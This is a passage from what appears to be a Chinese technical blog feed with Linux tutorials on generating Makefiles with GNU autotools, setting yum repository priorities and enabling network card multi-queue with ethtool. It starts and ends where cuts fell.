class="hljs-variable">$&#123;DISK&#125;</span><br></code></pre></td></tr></table></figure><p>参考地址：<a href="https://www.qingtingip.com/h_375642.html">https://www.qingtingip.com/h_375642.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux下Makefile的生成之路</title>
      <link href="/2019/12/11/makefile/"/>
      <url>/2019/12/11/makefile/</url>
      
        <content type="html"><![CDATA[<p>编译项目的过程中经常会需要执行 make 命令来操作 Makefile 编译命令，但是在有一些项目中是不存在 Makefile 文件的，这时候就需要手动先生成 Makefile 文件，然后在执行编译指令。</p><h2 id="一、流程介绍"><a href="#一、流程介绍" class="headerlink" title="一、流程介绍"></a>一、流程介绍</h2><p><img src="/assets/images/makefile-map.png" alt="Makefile文件的完成流程图 " loading="lazy"></p><ul><li><p><code>autoscan</code>：通过扫描源代码来搜寻普通的可移植性问题，比如检查编译器，库，头文件等，生成文件<code>configure.scan</code>，它是<code>configure.ac</code>的一个雏形；</p></li><li><p><code>aclocal</code>：根据已经安装的宏，用户定义宏和<code>acinclude.m4</code>文件中的宏将<code>configure.ac</code>文件所需要的宏集中定义到文件 <code>aclocal.m4</code>中，<code>aclocal</code>是一个<code>perl</code> 脚本程序，完整定义为：<code>aclocal - create aclocal.m4 by scanning configure.ac</code>；</p></li><li><p><code>automake</code>：将<code>Makefile.am</code>中定义的结构建立<code>Makefile.in</code>；</p></li><li><p><code>autoheader</code>：生成了<code>configure.h.in</code>（如果<code>configure.ac</code>中定义了AC_CONFIG_HEADER，那么此文件则必须存在）；</p></li><li><p><code>autoconf</code>：将<code>configure.ac</code>中的宏展开，生成<code>configure</code>脚本。这个过程可能要用到<code>aclocal.m4</code>中定义的宏；</p></li><li><p><code>configure脚本</code>：将生成的<code>Makefile.in</code>文件转换为<code>Makefile</code>；</p></li></ul><h2 id="二、流程实战"><a href="#二、流程实战" class="headerlink" title="二、流程实战"></a>二、流程实战</h2><h3 id="2-1、环境准备"><a href="#2-1、环境准备" class="headerlink" title="2.1、环境准备"></a>2.1、环境准备</h3><p>安装依赖的软件包<a href="https://www.gnu.org/software/automake/manual/automake.html">automake</a>与<a href="https://www.gnu.org/savannah-checkouts/gnu/autoconf/manual/autoconf-2.69/index.html">autoconf</a>；</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">yum -y install automake autoconf<br></code></pre></td></tr></table></figure><ul><li><code>automake</code>：包括<code>aclocal</code>、<code>automake</code>等；</li><li><code>autoconf</code>：包括<code>autoscan</code>、<code>autoconf</code>等</li></ul><h3 id="2-2、基础文件"><a href="#2-2、基础文件" class="headerlink" title="2.2、基础文件"></a>2.2、基础文件</h3><p>文件<code>main.c</code>：</p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-meta"># <span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Hello world!\r\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-3、autoscan"><a href="#2-3、autoscan" class="headerlink" title="2.3、autoscan"></a>2.3、autoscan</h3><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">[root@bugwz data]# ll<br>total 4<br>-rw-r--r-- 1 root root 84 Dec 10 15:47 main.c<br>[root@bugwz data]# autoscan<br>[root@bugwz data]# ll<br>total 8<br>-rw-r--r-- 1 root root   0 Dec 10 15:48 autoscan.log<br>-rw-r--r-- 1 root root 466 Dec 10 15:48 configure.scan<br>-rw-r--r-- 1 root root  84 Dec 10 15:47 main.c<br></code></pre></td></tr></table></figure><h3 id="2-4、aclocal"><a href="#2-4、aclocal" class="headerlink" title="2.4、aclocal"></a>2.4、aclocal</h3><p>将<code>configure.scan</code>文件修改为<code>configure.ac</code>文件；</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">[root@bugwz data]# <span class="hljs-built_in">mv</span> configure.scan configure.ac<br>[root@bugwz data]# ll<br>total 8<br>-rw-r--r-- 1 root root   0 Dec 10 15:48 autoscan.log<br>-rw-r--r-- 1 root root 466 Dec 10 15:48 configure.ac<br>-rw-r--r-- 1 root root  84 Dec 10 15:47 main.c<br></code></pre></td></tr></table></figure><p>结合实际信息修改<code>configure.ac</code>文件的内容；</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#                                               -*- Autoconf -*-</span><br><span class="hljs-comment"># Process this file with autoconf to produce a configure script.</span><br><br>AC_PREREQ([2.69])<br>AC_INIT([FULL-PACKAGE-NAME], [VERSION], [BUG-REPORT-ADDRESS])<br>AC_CONFIG_SRCDIR([main.c])<br>AC_CONFIG_HEADERS([config.h])<br><br><span class="hljs-comment"># Checks for programs.</span><br>AC_PROG_CC<br><br><span class="hljs-comment"># Checks for libraries.</span><br><br><span class="hljs-comment"># Checks for header files.</span><br><br><span class="hljs-comment"># Checks for typedefs, structures, and compiler characteristics.</span><br><br><span class="hljs-comment"># Checks for library functions.</span><br><br>AC_OUTPUT<br></code></pre></td></tr></table></figure><p>具体解释为：</p><ul><li><p><code>AC_PREREQ</code>：宏声明本文件要求的<code>autoconf</code>版本，本例使用的版本为2.69；</p><ul><li><code>AC_INIT</code>：宏用来定义软件的名称和版本等信息；</li><li><code>FULL-PACKAGE-NAME</code>：软件包名称；</li><li><code>VERSION</code>：软件版本号；</li><li><code>BUG-REPORT-ADDRESS</code>：BUG报告地址（一般为软件作者邮件地址）；</li></ul></li><li><p><code>AC_CONFIG_SRCDIR</code>：宏用来侦测所指定的源码文件是否存在，来确定源码目录的有效性。此处为当前目录下的main.c；</p></li><li><p><code>AC_CONFIG_HEADER</code>：宏用于生成<code>config.h</code>文件，以便<code>autoheader</code>使用；</p></li><li><p><code>AC_PROG_CC</code>：用来指定编译器，如果不指定，选用默认<code>gcc</code>；</p></li><li><p><code>AC_OUTPUT</code>：用来设定 <code>configure</code> 所要产生的文件，如果是<code>makefile</code>，<code>configure</code>会把它检查出来的结果带入<code>makefile.in</code>文件产生合适的<code>makefile</code>。使用<code>automake</code>时，还需要一些其他的参数，这些额外的宏用<code>aclocal</code>工具产生；</p></li></ul><p>修改后的<code>configure.ac</code>文件内容为：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#                                               -*- Autoconf -*-</span><br><span class="hljs-comment"># Process this file with autoconf to produce a configure script.</span><br><br>AC_PREREQ([2.69])<br>AC_INIT(helloworld, 1.0, admin@bugwz.com)<br>AM_INIT_AUTOMAKE(helloworld, 1.0)<br>AC_CONFIG_SRCDIR([main.c])<br>AC_CONFIG_HEADERS([config.h])<br><br><span class="hljs-comment"># Checks for programs.</span><br>AC_PROG_CC<br><br><span class="hljs-comment"># Checks for libraries.</span><br><br><span class="hljs-comment"># Checks for header files.</span><br><br><span class="hljs-comment"># Checks for typedefs, structures, and compiler characteristics.</span><br><br><span class="hljs-comment"># Checks for library functions.</span><br><br>AC_OUTPUT(Makefile)<br></code></pre></td></tr></table></figure><h3 id="2-5、autoconf"><a href="#2-5、autoconf" class="headerlink" title="2.5、autoconf"></a>2.5、autoconf</h3><p>生成<code>configure</code>文件：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">[root@bugwz data]# autoconf<br>[root@bugwz data]# ll<br>total 116<br>drwxr-xr-x 2 root root   4096 Dec 10 15:56 autom4te.cache<br>-rw-r--r-- 1 root root      0 Dec 10 15:48 autoscan.log<br>-rwxr-xr-x 1 root root 104622 Dec 10 15:56 configure<br>-rw-r--r-- 1 root root    446 Dec 10 15:55 configure.ac<br>-rw-r--r-- 1 root root     84 Dec 10 15:47 main.c<br></code></pre></td></tr></table></figure><h3 id="2-6、autoheader"><a href="#2-6、autoheader" class="headerlink" title="2.6、autoheader"></a>2.6、autoheader</h3><p>使用<code>autoheader</code>生成<code>configure.h.in</code>，如果在<code>configure.ac</code>中定义了<code>AC_CONFIG_HEADER</code>，那么此文件就必须存在；</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">[root@bugwz data]# autoheader<br>[root@bugwz data]# ll<br>total 120<br>drwxr-xr-x 2 root root   4096 Dec 10 15:56 autom4te.cache<br>-rw-r--r-- 1 root root      0 Dec 10 15:48 autoscan.log<br>-rw-r--r-- 1 root root    539 Dec 10 15:56 config.h.in<br>-rwxr-xr-x 1 root root 104622 Dec 10 15:56 configure<br>-rw-r--r-- 1 root root    446 Dec 10 15:55 configure.ac<br>-rw-r--r-- 1 root root     84 Dec 10 15:47 main.c<br></code></pre></td></tr></table></figure><h3 id="2-7、新增Makefile-am"><a href="#2-7、新增Makefile-am" class="headerlink" title="2.7、新增Makefile.am"></a>2.7、新增Makefile.am</h3><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">[root@bugwz data]# vi Makefile.am<br>[root@bugwz data]# <span class="hljs-built_in">cat</span> Makefile.am<br>AUTOMAKE_OPTIONS=foreign<br>bin_PROGRAMS=helloworld<br>helloworld_SOURCES=main.c<br></code></pre></td></tr></table></figure><ul><li><code>AUTOMAKE_OPTIONS</code>：设置<code>automake</code>的选项。由于<code>GNU</code>对自己发布的软件有严格的规范，比如必须附带许可证声明文件<code>COPYING</code>等，否则<code>automake</code>执行时会报错。<code>automake</code>提供了<code>3种</code>软件等级：<code>foreign</code>、<code>gnu</code>和<code>gnits</code>，默认为<code>gnu</code>。本例使需用foreign等级，它只检测必须的文件；</li><li><code>bin_PROGRAMS</code>：定义要产生的执行文件名。如果要产生多个执行文件，每个文件名用空格隔开；</li><li><code>helloworld_SOURCES</code>：定义<code>helloworld</code>这个执行程序所需要的原始文件。如果<code>helloworld</code>这个程序是由多个原始文件所产生的，则必须把它所用到的所有原始文件都列出来，并用空格隔开。例如：若目标体<code>helloworld</code>需要<code>main.c</code>一个依赖文件，则定义<code>helloworld_SOURCES=main.c</code>；</li></ul><h3 id="2-8、automake"><a href="#2-8、automake" class="headerlink" title="2.8、automake"></a>2.8、automake</h3><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">[root@bugwz data]# automake --add-missing<br>configure.ac:6: warning: AM_INIT_AUTOMAKE: two- and three-arguments forms are deprecated.  For more info, see:<br>configure.ac:6: http://www.gnu.org/software/automake/manual/automake.html#Modernize-AM_005fINIT_005fAUTOMAKE-invocation<br>configure.ac:6: installing <span class="hljs-string">&#x27;./install-sh&#x27;</span><br>configure.ac:6: installing <span class="hljs-string">&#x27;./missing&#x27;</span><br>Makefile.am: installing <span class="hljs-string">&#x27;./depcomp&#x27;</span><br><br>[root@bugwz data]# ll<br>total 224<br>-rw-r--r-- 1 root root     77 Dec 10 16:00 Makefile.am<br>-rw-r--r-- 1 root root  23322 Dec 10 16:11 Makefile.<span class="hljs-keyword">in</span><br>-rw-r--r-- 1 root root  37794 Dec 10 16:10 aclocal.m4<br>drwxr-xr-x 2 root root   4096 Dec 10 16:11 autom4te.cache<br>-rw-r--r-- 1 root root      0 Dec 10 15:48 autoscan.log<br>-rw-r--r-- 1 root root    625 Dec 10 16:10 config.h.in<br>-rwxr-xr-x 1 root root 141852 Dec 10 16:10 configure<br>-rw-r--r-- 1 root root    490 Dec 10 16:10 configure.ac<br>lrwxrwxrwx 1 root root     32 Dec 10 16:11 depcomp -&gt; /usr/share/automake-1.13/depcomp<br>lrwxrwxrwx 1 root root     35 Dec 10 16:11 install-sh -&gt; /usr/share/automake-1.13/install-sh<br>-rw-r--r-- 1 root root     84 Dec 10 15:47 main.c<br>lrwxrwxrwx 1 root root     32 Dec 10 16:11 missing -&gt; /usr/share/automake-1.13/missing<br></code></pre></td></tr></table></figure><h3 id="2-9、configure与make"><a href="#2-9、configure与make" class="headerlink" title="2.9、configure与make"></a>2.9、configure与make</h3><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">[root@bugwz data]# ./configure<br>checking <span class="hljs-keyword">for</span> a BSD-compatible install... /usr/bin/install -c<br>checking whether build environment is sane... <span class="hljs-built_in">yes</span><br>checking <span class="hljs-keyword">for</span> a thread-safe <span class="hljs-built_in">mkdir</span> -p... /usr/bin/mkdir -p<br>checking <span class="hljs-keyword">for</span> gawk... gawk<br>checking whether make sets $(MAKE)... <span class="hljs-built_in">yes</span><br>checking whether make supports nested variables... <span class="hljs-built_in">yes</span><br>checking <span class="hljs-keyword">for</span> gcc... gcc<br>checking whether the C compiler works... <span class="hljs-built_in">yes</span><br>checking <span class="hljs-keyword">for</span> C compiler default output file name... a.out<br>checking <span class="hljs-keyword">for</span> suffix of executables...<br>checking whether we are cross compiling... no<br>checking <span class="hljs-keyword">for</span> suffix of object files... o<br>checking whether we are using the GNU C compiler... <span class="hljs-built_in">yes</span><br>checking whether gcc accepts -g... <span class="hljs-built_in">yes</span><br>checking <span class="hljs-keyword">for</span> gcc option to accept ISO C89... none needed<br>checking <span class="hljs-keyword">for</span> style of include used by make... GNU<br>checking dependency style of gcc... gcc3<br>checking that generated files are newer than configure... <span class="hljs-keyword">done</span><br>configure: creating ./config.status<br>config.status: creating Makefile<br>config.status: creating config.h<br>config.status: executing depfiles commands<br><br>[root@bugwz data]# make<br>make  all-am<br>make[1]: Entering directory `/data<span class="hljs-string">&#x27;</span><br><span class="hljs-string">gcc -DHAVE_CONFIG_H -I.     -g -O2 -MT main.o -MD -MP -MF .deps/main.Tpo -c -o main.o main.c</span><br><span class="hljs-string">mv -f .deps/main.Tpo .deps/main.Po</span><br><span class="hljs-string">gcc  -g -O2   -o helloworld main.o</span><br><span class="hljs-string">make[1]: Leaving directory `/data&#x27;</span><br><br>[root@bugwz data]# ll<br>total 320<br>-rw-r--r-- 1 root root  22880 Dec 10 16:12 Makefile<br>-rw-r--r-- 1 root root     77 Dec 10 16:00 Makefile.am<br>-rw-r--r-- 1 root root  23322 Dec 10 16:11 Makefile.<span class="hljs-keyword">in</span><br>-rw-r--r-- 1 root root  37794 Dec 10 16:10 aclocal.m4<br>drwxr-xr-x 2 root root   4096 Dec 10 16:11 autom4te.cache<br>-rw-r--r-- 1 root root      0 Dec 10 15:48 autoscan.log<br>-rw-r--r-- 1 root root    781 Dec 10 16:12 config.h<br>-rw-r--r-- 1 root root    625 Dec 10 16:10 config.h.in<br>-rw-r--r-- 1 root root   8471 Dec 10 16:12 config.log<br>-rwxr-xr-x 1 root root  32335 Dec 10 16:12 config.status<br>-rwxr-xr-x 1 root root 141852 Dec 10 16:10 configure<br>-rw-r--r-- 1 root root    490 Dec 10 16:10 configure.ac<br>lrwxrwxrwx 1 root root     32 Dec 10 16:11 depcomp -&gt; /usr/share/automake-1.13/depcomp<br>-rwxr-xr-x 1 root root  10808 Dec 10 16:12 helloworld<br>lrwxrwxrwx 1 root root     35 Dec 10 16:11 install-sh -&gt; /usr/share/automake-1.13/install-sh<br>-rw-r--r-- 1 root root     84 Dec 10 15:47 main.c<br>-rw-r--r-- 1 root root   5952 Dec 10 16:12 main.o<br>lrwxrwxrwx 1 root root     32 Dec 10 16:11 missing -&gt; /usr/share/automake-1.13/missing<br>-rw-r--r-- 1 root root     23 Dec 10 16:12 stamp-h1<br>[root@bugwz data]# ./helloworld<br>Hello world!<br></code></pre></td></tr></table></figure><h3 id="2-10、打包"><a href="#2-10、打包" class="headerlink" title="2.10、打包"></a>2.10、打包</h3><h4 id="2-10-1、执行打包"><a href="#2-10-1、执行打包" class="headerlink" title="2.10.1、执行打包"></a>2.10.1、执行打包</h4><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">[root@bugwz data]# make dist<br>make  dist-gzip am__post_remove_distdir=<span class="hljs-string">&#x27;@:&#x27;</span><br>make[1]: Entering directory `/data<span class="hljs-string">&#x27;</span><br><span class="hljs-string">if test -d &quot;helloworld-1.0&quot;; then find &quot;helloworld-1.0&quot; -type d ! -perm -200 -exec chmod u+w &#123;&#125; &#x27;</span>;<span class="hljs-string">&#x27; &amp;&amp; rm -rf &quot;helloworld-1.0&quot; || &#123; sleep 5 &amp;&amp; rm -rf &quot;helloworld-1.0&quot;; &#125;; else :; fi</span><br><span class="hljs-string">test -d &quot;helloworld-1.0&quot; || mkdir &quot;helloworld-1.0&quot;</span><br><span class="hljs-string">test -n &quot;&quot; \</span><br><span class="hljs-string">|| find &quot;helloworld-1.0&quot; -type d ! -perm -755 \</span><br><span class="hljs-string">-exec chmod u+rwx,go+rx &#123;&#125; \; -o \</span><br><span class="hljs-string">  ! -type d ! -perm -444 -links 1 -exec chmod a+r &#123;&#125; \; -o \</span><br><span class="hljs-string">  ! -type d ! -perm -400 -exec chmod a+r &#123;&#125; \; -o \</span><br><span class="hljs-string">  ! -type d ! -perm -444 -exec /bin/sh /data/install-sh -c -m a+r &#123;&#125; &#123;&#125; \; \</span><br><span class="hljs-string">|| chmod -R a+r &quot;helloworld-1.0&quot;</span><br><span class="hljs-string">tardir=helloworld-1.0 &amp;&amp; $&#123;TAR-tar&#125; chof - &quot;$tardir&quot; | GZIP=--best gzip -c &gt;helloworld-1.0.tar.gz</span><br><span class="hljs-string">make[1]: Leaving directory `/data&#x27;</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">test</span> -d <span class="hljs-string">&quot;helloworld-1.0&quot;</span>; <span class="hljs-keyword">then</span> find <span class="hljs-string">&quot;helloworld-1.0&quot;</span> -<span class="hljs-built_in">type</span> d ! -perm -200 -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">chmod</span> u+w &#123;&#125; <span class="hljs-string">&#x27;;&#x27;</span> &amp;&amp; <span class="hljs-built_in">rm</span> -rf <span class="hljs-string">&quot;helloworld-1.0&quot;</span> || &#123; <span class="hljs-built_in">sleep</span> 5 &amp;&amp; <span class="hljs-built_in">rm</span> -rf <span class="hljs-string">&quot;helloworld-1.0&quot;</span>; &#125;; <span class="hljs-keyword">else</span> :; <span class="hljs-keyword">fi</span><br><br>[root@bugwz data]# ll<br>total 392<br>-rw-r--r-- 1 root root  22880 Dec 10 16:12 Makefile<br>-rw-r--r-- 1 root root     77 Dec 10 16:00 Makefile.am<br>-rw-r--r-- 1 root root  23322 Dec 10 16:11 Makefile.<span class="hljs-keyword">in</span><br>-rw-r--r-- 1 root root  37794 Dec 10 16:10 aclocal.m4<br>drwxr-xr-x 2 root root   4096 Dec 10 16:11 autom4te.cache<br>-rw-r--r-- 1 root root      0 Dec 10 15:48 autoscan.log<br>-rw-r--r-- 1 root root    781 Dec 10 16:12 config.h<br>-rw-r--r-- 1 root root    625 Dec 10 16:10 config.h.in<br>-rw-r--r-- 1 root root   8471 Dec 10 16:12 config.log<br>-rwxr-xr-x 1 root root  32335 Dec 10 16:12 config.status<br>-rwxr-xr-x 1 root root 141852 Dec 10 16:10 configure<br>-rw-r--r-- 1 root root    490 Dec 10 16:10 configure.ac<br>lrwxrwxrwx 1 root root     32 Dec 10 16:11 depcomp -&gt; /usr/share/automake-1.13/depcomp<br>-rwxr-xr-x 1 root root  10808 Dec 10 16:12 helloworld<br>-rw-r--r-- 1 root root  71614 Dec 10 16:13 helloworld-1.0.tar.gz<br>lrwxrwxrwx 1 root root     35 Dec 10 16:11 install-sh -&gt; /usr/share/automake-1.13/install-sh<br>-rw-r--r-- 1 root root     84 Dec 10 15:47 main.c<br>-rw-r--r-- 1 root root   5952 Dec 10 16:12 main.o<br>lrwxrwxrwx 1 root root     32 Dec 10 16:11 missing -&gt; /usr/share/automake-1.13/missing<br>-rw-r--r-- 1 root root     23 Dec 10 16:12 stamp-h1<br></code></pre></td></tr></table></figure><h4 id="2-10-2、校验打包"><a href="#2-10-2、校验打包" class="headerlink" title="2.10.2、校验打包"></a>2.10.2、校验打包</h4><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">[root@bugwz data]# tar -zxvf helloworld-1.0.tar.gz<br>[root@bugwz data]# ll helloworld-1.0<br>total 268<br>-rw-r--r-- 1 root root     77 Dec 10 16:00 Makefile.am<br>-rw-r--r-- 1 root root  23322 Dec 10 16:11 Makefile.<span class="hljs-keyword">in</span><br>-rw-r--r-- 1 root root  37794 Dec 10 16:10 aclocal.m4<br>-rw-r--r-- 1 root root    625 Dec 10 16:10 config.h.in<br>-rwxr-xr-x 1 root root 141852 Dec 10 16:10 configure<br>-rw-r--r-- 1 root root    490 Dec 10 16:10 configure.ac<br>-rwxr-xr-x 1 root root  23566 Jun 10  2014 depcomp<br>-rwxr-xr-x 1 root root  13997 Jun 10  2014 install-sh<br>-rw-r--r-- 1 root root     84 Dec 10 15:47 main.c<br>-rwxr-xr-x 1 root root   6873 Jun 10  2014 missing<br></code></pre></td></tr></table></figure><p>参考链接：<a href="https://www.cnblogs.com/bugutian/p/5560548.html">https://www.cnblogs.com/bugutian/p/5560548.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> C/C++ </tag>
            
            <tag> Makefile </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Yum源的优先级配置之yum-priorities</title>
      <link href="/2019/12/01/yum-priorities/"/>
      <url>/2019/12/01/yum-priorities/</url>
      
        <content type="html"><![CDATA[<h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p>Linux 发行版比较多，同时还有很多个人或组织维护了某些特定用途的安装&#x2F;升级源。<strong>Yum Priorities</strong> 插件可以用来强制保护源。它通过给各个源设定不同的优先级，使得系统管理员可以将某些源设定为最高优先级，从而保证系统的稳定性。</p><h2 id="二、yum-priorities"><a href="#二、yum-priorities" class="headerlink" title="二、yum-priorities"></a>二、yum-priorities</h2><h3 id="2-1、安装"><a href="#2-1、安装" class="headerlink" title="2.1、安装"></a>2.1、安装</h3><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">yum install -y yum-priorities<br></code></pre></td></tr></table></figure><h3 id="2-2、配置验证"><a href="#2-2、配置验证" class="headerlink" title="2.2、配置验证"></a>2.2、配置验证</h3><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/yum/pluginconf.d/product-id.conf<br></code></pre></td></tr></table></figure><p>需要确认的是，如果<code>enabled</code>的配置为<code>1</code>，代表已经启用了yum源的配置优先级；</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">[main]<br>enabled=1<br></code></pre></td></tr></table></figure><h3 id="2-3、配置优先级调整"><a href="#2-3、配置优先级调整" class="headerlink" title="2.3、配置优先级调整"></a>2.3、配置优先级调整</h3><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">[Example 1]<br>name=Example_1<br>baseurl=http://mirror.centos.org/centos/<span class="hljs-variable">$releasever</span>/example_1/<span class="hljs-variable">$basearch</span>/<br>priority=10<br>gpgcheck=0<br>enabled=1<br><br>[Example 2]<br>name=Example_2<br>baseurl=http://mirror.centos.org/centos/<span class="hljs-variable">$releasever</span>/example_2/<span class="hljs-variable">$basearch</span>/<br>priority=20<br>gpgcheck=0<br>enabled=1<br></code></pre></td></tr></table></figure><p>关于上述配置的解释为：</p><ul><li>其中<code>priority=N</code>，<code>N</code>的值为：<code>1-99</code>，当数字越大，优先级越低；</li><li>当<code>Example_1</code>与<code>Example_2</code>的源中存在同名同版本的软件包时，优先安装<code>Example_1</code>中的安装包；</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> yum </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网卡多队列技术学习</title>
      <link href="/2019/11/30/network-multi-queue/"/>
      <url>/2019/11/30/network-multi-queue/</url>
      
        <content type="html"><![CDATA[<h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p>网卡多队列是一种技术，最初是用来解决 网络IO 的 <code>QoS （Quality Of Service）</code>问题。网卡多队列需要硬件和驱动同时支持。网卡多队列驱动将各个队列通过将中断绑定到不同的核上，从而解决网络I&#x2F;O带宽升高时单核CPU的处理瓶颈，提升网络PPS和带宽性能。经测试，在相同的网络PPS和网络带宽的条件下，与1个队列相比，2个队列最多可提升性能达50%到100%，4个队列的性能提升更大。</p><h2 id="二、启用网卡多队列"><a href="#二、启用网卡多队列" class="headerlink" title="二、启用网卡多队列"></a>二、启用网卡多队列</h2><h3 id="2-1、网卡是否支持多队列"><a href="#2-1、网卡是否支持多队列" class="headerlink" title="2.1、网卡是否支持多队列"></a>2.1、网卡是否支持多队列</h3><h4 id="2-1-1、ethtool方式验证"><a href="#2-1-1、ethtool方式验证" class="headerlink" title="2.1.1、ethtool方式验证"></a>2.1.1、ethtool方式验证</h4><p>安装指令为：<code>yum -y install ethtool net-tools</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">[root@bugwz /]# ethtool -l eth0<br>Channel parameters <span class="hljs-keyword">for</span> eth0:<br>Pre-<span class="hljs-built_in">set</span> maximums:<br>RX:0<br>TX:0<br>Other:1<br>Combined:8     <span class="hljs-comment"># 最大支持设置的网卡队列数</span><br>Current hardware settings:<br>RX:0<br>TX:0<br>Other:1<br>Combined:8     <span class="hljs-comment"># 当前eth0启动的网卡队列数</span><br></code></pre></td></tr></table></figure><h4 id="2-1-2、lspci指令验证"><a href="#2-1-2、lspci指令验证" class="headerlink" title="2.1.2、lspci指令验证"></a>2.1.2、lspci指令验证</h4><p>查看硬件是否支持网卡多队列，使用指令<code>lspci -vvv</code>（安装指令为：<code>yum -y install pciutils</code>），查看<code>Ethernet controller</code>项目信息中是否存在<code>MSI-X</code>，<code>Enable+</code>并且<code>Count &gt; 1</code>，如果存在的话则该网卡支持网卡多队列；</p><p><img src="/assets/images/network-queue-ethernet-controller.png" alt="Ethernet controller" loading="lazy"></p><h3 id="2-2、是否启用了网卡多队列"><a href="#2-2、是否启用了网卡多队列" class="headerlink" title="2.2、是否启用了网卡多队列"></a>2.2、是否启用了网卡多队列</h3><h4 id="2-2-1、ethtool指令验证"><a href="#2-2-1、ethtool指令验证" class="headerlink" title="2.2.1、ethtool指令验证"></a>2.2.1、ethtool指令验证</h4><p>使用<code>ethtool</code>工具查看是否开启了网卡多队列</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">[root@bugwz /]# ethtool -l eth0<br>Channel parameters <span class="hljs-keyword">for</span> eth0:<br>Pre-<span class="hljs-built_in">set</span> maximums:<br>RX:0<br>TX:0<br>Other:1<br>Combined:8     <span class="hljs-comment"># 最大支持设置的网卡队列数</span><br>Current hardware settings:<br>RX:0<br>TX:0<br>Other:1<br>Combined:8     <span class="hljs-comment"># 当前eth0启动的网卡队列数</span><br></code></pre></td></tr></table></figure><h4 id="2-2-2、-proc-interrupts-文件验证"><a href="#2-2-2、-proc-interrupts-文件验证" class="headerlink" title="2.2.2、&#x2F;proc&#x2F;interrupts 文件验证"></a>2.2.2、&#x2F;proc&#x2F;interrupts 文件验证</h4><p>使用<code>cat /proc/interrupts</code>查看当前是否已经开启了网卡多队列，通过查看网卡的中断集中分布在哪些CPU上，如果分布在多个CPU上，则当前已经开启了网卡多队列。</p><p><img src="/assets/images/network-queue-proc-interrupts.png" alt="&#x2F;proc&#x2F;interrupts文件" loading="lazy"></p><ul><li>第一列：IRQ号；</li><li>CPU 0～7：表示对应的CPU，下面对应的数值表示某个CPU在某一项上被中断的次数；</li><li>NMI和LOC：系统所使用的驱动，用户无法访问和配置；</li><li>…</li></ul><h3 id="2-3、开启网卡多队列"><a href="#2-3、开启网卡多队列" class="headerlink" title="2.3、开启网卡多队列"></a>2.3、开启网卡多队列</h3><h4 id="2-3-1、ethtool指令开启"><a href="#2-3-1、ethtool指令开启" class="headerlink" title="2.3.1、ethtool指令开启"></a>2.3.1、ethtool指令开启</h4><p>使用<code>ethtool</code>修改启用网卡队列的数量，修改完成后再次查看如下所示：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">[root@bugwz /]# ethtool -L eth0 combined 4<br>[root@bugwz /]# ethtool -l eth0<br>Channel parameters <span class="hljs-keyword">for</span> eth0:<br>Pre-<span class="hljs-built_in">set</span> maximums:<br>RX:0<br>TX:0<br>Other:1<br>Combined:8     <span class="hljs-comment"># 最大支持设置的网卡队列数</span><br>Current hardware settings:<br>RX:0<br>TX:0<br>Other:1<br>Combined:4     <span class="hljs-comment"># 当前eth0启动的网卡队列数</span><br></code></pre></td></tr></table></figure><h3 id="2-4、配置网卡多队列"><a href="#2-4、配置网卡多队列" class="headerlink" title="2.4、配置网卡多队列"></a>2.4、配置网卡多队列</h3><h4 id="2-4-1、手动配置"><a href="#2-4-1、手动配置" class="headerlink" title="2.4.1、手动配置"></a>2.4.1、手动配置</h4><h5 id="2-4-1-1、获取中断号"><a href="#2-4-1-1、获取中断号" class="headerlink" title="2.4.1.1、获取中断号"></a>2.4.1.1、获取中断号</h5><p>在启用了网卡多队列之后，可以通过<code>cat /proc/interrupts</code>指令查看对应的网卡的中断号信息；</p><p><img src="/assets/images/network-queue-proc-interrupt-click.png" alt="&#x2F;proc&#x2F;interrupt文件" loading="lazy"></p><h5 id="2-4-1-2、设置中断亲和性"><a href="#2-4-1-2、设置中断亲和性" class="headerlink" title="2.4.1.2、设置中断亲和性"></a>2.4.1.2、设置中断亲和性</h5><p>文件<code>/proc/irq/${IRQ_NUM}/smp_affinity</code>为中断号为<code>IRQ_NUM</code>的中断绑定的<code>CPU</code>的情况。文件中的参数以十六进制表示，将其转换为二进制后的每一位代表一个CPU，默认值为<code>全f</code>，表明将中断发给所有的CPU进行处理。</p><p>如果要将对应的中断绑定到<code>CPU 0～3</code>上，我们可执行如下指令：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code 